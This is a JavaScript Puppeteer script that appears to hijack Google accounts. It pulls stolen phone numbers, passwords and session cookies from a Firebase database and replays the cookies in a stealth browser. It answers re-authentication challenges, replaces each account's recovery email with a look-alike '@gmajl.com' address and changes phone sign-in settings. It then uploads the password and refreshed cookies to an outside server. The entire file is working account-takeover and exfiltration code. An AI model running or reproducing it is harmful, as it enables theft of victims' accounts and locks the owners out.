const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const axios = require('axios')


const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/raiyan086/collect' 


let mCookie = [
    {
      name: 'LSID',
      value: '',       
      domain: 'accounts.google.com',
      path: '/',
      expires: 1768227818.828837,
      size: 94,
      httpOnly: true,
      secure: true,
      session: false,
      sameSite: 'None',
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'OSID',
      value: '',
      domain: 'myaccount.google.com',
      path: '/',
      expires: 1771251816.153073,
      size: 157,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SAPISID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957588,
      size: 41,
      httpOnly: false,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'APISID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957573,
      size: 40,
      httpOnly: false,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957563,
      size: 21,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: '__Secure-1PSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957496,
      size: 167,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: true,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957482,
      size: 156,
      httpOnly: false,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'HSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1771251815.957553,
      size: 21,
      httpOnly: true,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    }
]

puppeteer.use(StealthPlugin())


startServer()


async function startServer() {
    while (true) {
        let data = await getGmailData()
        if (data) {
            await loginWithCompleted(data.number, data.password, data.cookies)
        } else {
            await delay(10000)
        }
    }
}

async function loginWithCompleted(number, password, cookies) {
    try {
        if (await isValidCookies(cookies)) {
            console.log('Cookies Valid: '+number)
            
            let browser = await puppeteer.launch({
                headless: false,
                headless: 'new',
                args: [
                    '--no-sandbox',
                    '--disable-notifications',
                    '--disable-setuid-sandbox',
                    '--ignore-certificate-errors',
                    '--ignore-certificate-errors-skip-list',
                    '--disable-dev-shm-usage'
                ]
            })
        
            let loadCookie = {}
            let tempCookie = cookies.split(';')

            for (let i = 0; i < tempCookie.length; i++) {
                try {
                    let split = tempCookie[i].trim().split('=')
                    if (split.length == 2) {
                        loadCookie[split[0]] = split[1]
                    }
                } catch (error) {}
            }

            mCookie.forEach((cookie) => {
                let value = loadCookie[cookie['name']]

                if (value) {
                    cookie['value'] = value
                    cookie['size'] = value.length
                }
            })
            
            let page = (await browser.pages())[0]

            page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

            await page.setCookie(...mCookie)

            let mCodeSend = false
            let mRapt = null
            let mNumber = []

            try {
                await page.goto('https://myaccount.google.com/phone')
                await delay(1000)

                mNumber = await page.evaluate(() => {
                    let list = document.querySelectorAll('script')
                    let number = null
                    let token = null
                    let years = []
                    let year = parseInt(new Date().getFullYear())

                    try {
                        for (let i = 0; i < list.length; i++) {
                            let html = list[i].innerHTML
                            if (html.startsWith('AF_initDataCallback') && html.includes('rescuephone')) {
                                let data_list = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))
                                let data = data_list[0]
                                for (let i = 0; i < data.length; i++) {
                                    years.push(data[i][18])
                                    let list = data[i][11][0][1]
                                    list.sort(function(a, b){return a - b})
                                    let out = list
                                    if (list.length > 2) {
                                        let temp = {}
                                        out = []
                                        for (let j = 0; j < list.length; j++) {
                                            temp[list[j]] = 'x'
                                        }
                                        let hasNum = data_list[1]
                                        for (let j = 0; j < hasNum.length; j++) {
                                            if(temp[hasNum[j][0]] != null && hasNum[j][2] == true) {
                                                out.push(hasNum[j][0])
                                            }
                                        }
                                    }
                                    out.sort(function(a, b){return a - b})
                                    if (out[0] == 1) {
                                        number = data[i][0]
                                    }
                                }
                            }
                        }
    
                        years.sort(function(a, b){return a-b})
                        if(years.length > 0) {
                            year = parseInt(new Date(years[0]).getFullYear())
                        }
                    } catch (error) {}

                    let root = document.querySelectorAll('div[data-encrypted-phone]')
                
                    if (root) {
                        for (let i = 0; i < root.length; i++) {
                            try {
                                let data = root[i].getAttribute('data-encrypted-phone')
                                
                                if (root[i].getAttribute('data-phone') == number && data) {
                                    token = data
                                    break
                                }
                            } catch (error) {}
                        }
                    }

                    return { number:number, token:token, year:year }
                })
                
                console.log('Create Year: '+mNumber.year)

                for (let k = 0; k < 2; k++) {
                    await page.goto('https://myaccount.google.com/signinoptions/rescuephone')

                    await delay(1000)

                    let url = await page.url()

                    if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
                        mRapt = await getRapt(url)
                        console.log('Rapt Token Read: '+number)
                        break
                    } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
                        console.log('Login Challenge: '+number)
                        await page.type('input[type="password"]', password)
                        await delay(500)
                        await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')

                        let cSelection = true
                        let cNumber = true
                        mCodeSend = false
                        
                        for (let load = 0; load < 30; load++) {
                            try {
                                let url = await page.url()

                                if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
                                    mRapt = await getRapt(url)
                                    break
                                } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/dp')) {
                                    break
                                } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') && cSelection) {
                                    if (await exists(page, 'div[data-action="selectchallenge"][data-challengetype="13"]')) {
                                        await delay(2000)
                                        console.log('Login Selection Challenge: '+number)
                                        await page.click('div[data-action="selectchallenge"][data-challengetype="13"]')
                                        cSelection = false
                                        load = 0
                                    }
                                } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/kpp') && cNumber) {
                                    if (await exists(page, 'input#phoneNumberId')) {
                                        await delay(2000)
                                        await page.type('input#phoneNumberId', mNumber.number)
                                        console.log('Login Number Challenge: '+mNumber.number)
                                        await delay(500)
                                        await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
                                        cNumber = false
                                        load = 10
                                    }
                                } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
                                    console.log('OTP Send: '+mNumber.number)
                                    mCodeSend = true
                                    break
                                }
                            } catch (error) {}

                            await delay(500)
                        }

                        if (mCodeSend) {
                            continue
                        }

                        if (mRapt) {
                            console.log('Login Success: '+number)
                        } else {
                            console.log('Login Failed: '+number)
                        }

                        break
                    }
                }
            } catch (error) {}

            try {
                let mUser = null

                if (mRapt) {
                    await page.goto('https://myaccount.google.com/recovery/email?rapt='+mRapt)
                    await delay(1000)

                    let hasMail = await page.evaluate(() => {
                        let root = document.querySelector('input[type="email"]')
                        if (root) {
                            return root.value.length > 0
                        }
                    })

                    mUser = await page.evaluate(() => {
                        let data = window.WIZ_global_data
                        if (data) {
                            let gmail = data.oPEP7c
                            if (gmail) {
                                return gmail.replace('@gmail.com', '')
                            }
                        }
                        return null
                    })

                    await page.focus('input[type="email"]')
                    if (hasMail) {
                        await page.keyboard.down('Control')
                        await page.keyboard.press('A')
                        await page.keyboard.up('Control')
                        await page.keyboard.press('Backspace')
                    }
                    await page.keyboard.type(mUser+'@gmajl.com')
                    await delay(500)
                    await page.click('button[type="submit"]')
                    await delay(3000)

                    console.log('Set Recovary Gmail: '+mUser+'@gmail.com')

                    try {
                        await page.goto('https://myaccount.google.com/phone?rapt='+mRapt+'&ph='+mNumber.token)
                        await delay(1000)
                        let isChecked = await page.evaluate(() => {
                            try {
                                let root = document.querySelector('div[role="checkbox"]')
                                if (root) {
                                    let checked = root.getAttribute('aria-checked')
                                    return checked == 'true' || checked == true
                                }
                            } catch (error) {}
                        })

                        if (isChecked) {
                            await page.click('div[role="checkbox"]')
                            await delay(3000)
                        }
                    } catch (error) {}
                }

                let n_cookies = await getNewCookies(await page.cookies())

                await page.goto('about:blank')

                if (mRapt == null) {
                    console.log('Chenge Error: '+number)
                
                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code/error/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, otp:mCodeSend, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    })
                } else {
                    console.log('All Chenge Success: '+number)
                
                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code/pending/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    })
                }

                try {
                    await axios.delete(BASE_URL+'/'+number+'.json')
                } catch (error) {}
            } catch (error) {}

            try {
                if (page != null) {
                    await page.close()
                }
            } catch (error) {}

            try {
                if (browser != null) {
                    await browser.close()
                }
            } catch (error) {}   
        } else {
            console.log('Coocies Expire: '+number)

            await axios.delete(BASE_URL+'/'+number+'.json')
        }
    } catch (error) {}
}

async function isValidCookies(cookies) {
    try {
        let response = await axios.get('https://myaccount.google.com/phone', {
            headers: {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'cookie': cookies,
                'priority': 'u=0, i',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-form-factors': '"Desktop"',
                'sec-ch-ua-full-version': '"131.0.6778.265"',
                'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.265", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"19.0.0"',
                'sec-ch-ua-wow64': '?0',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            },
            validateStatus: null,
            maxRedirects: 0
        })

        let location = response.headers['location']

        if (location) {
            return false
        } else {
            return true
        }
    } catch (error) {}

    return false
}

async function getNewCookies(cookies) {
    let cookie = ''

    for (let i = 0; i < cookies.length; i++) {
        try {
            cookie += cookies[i]['name']+'='+cookies[i]['value']+(i == cookies.length-1 ? '' : '; ')
        } catch (error) {}
    }

    return cookie
}

async function getRapt(url) {
    try {
        if (url.includes('rapt=')) {
            let temp = url.substring(url.indexOf('rapt=')+5, url.length)

            if (temp.includes('&')) {
                return temp.substring(0, temp.indexOf('&'))
            } else {
                return temp
            }
        }
    } catch (error) {}

    return null
}

async function exists(page, element) {
    return await page.evaluate((element) => {
        let root = document.querySelector(element)
        if (root) {
            return true
        }
        return false
    }, element)
}

async function getGmailData() {

    try {
        let response = await axios.get(BASE_URL+'.json?orderBy=%22$key%22&limitToFirst=1')
        let data = response.data
        if (data) {
            let number = Object.keys(data)[0]
            let split = data[number].split('||')
            return { number:number, password:split[0], cookies:split[1] }
        }
    } catch (error) {}

    return null
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
